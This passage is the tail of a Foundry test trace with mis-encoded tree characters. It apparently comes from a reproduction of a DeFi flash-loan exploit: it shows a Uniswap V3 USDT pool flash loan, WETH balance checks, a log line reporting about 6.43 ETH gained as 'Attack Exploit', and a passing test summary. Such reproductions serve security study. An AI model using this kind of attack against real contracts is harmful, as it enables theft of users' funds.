    в”‚   в”‚   в””в”Ђ в†ђ [Return] 775273143927997686533 [7.752e20]
    в”‚   в”њв”Ђ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 3033512964845 [3.033e12]
    в”‚   в”њв”Ђ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 100000000000000000 [1e17], param3: 0, param4: 10000000000000 [1e13], param5: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 6432936950955627431 [6.432e18]
    в”њв”Ђ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 6432936950955627431 [6.432e18]
    в”њв”Ђ [0] console::log("Attack Exploit: %s.%s ETH", 6, 432936950955627431 [4.329e17]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Stop] 
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.13s (3.49s CPU time)

Ran 2 test suites in 4.13s (4.37s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
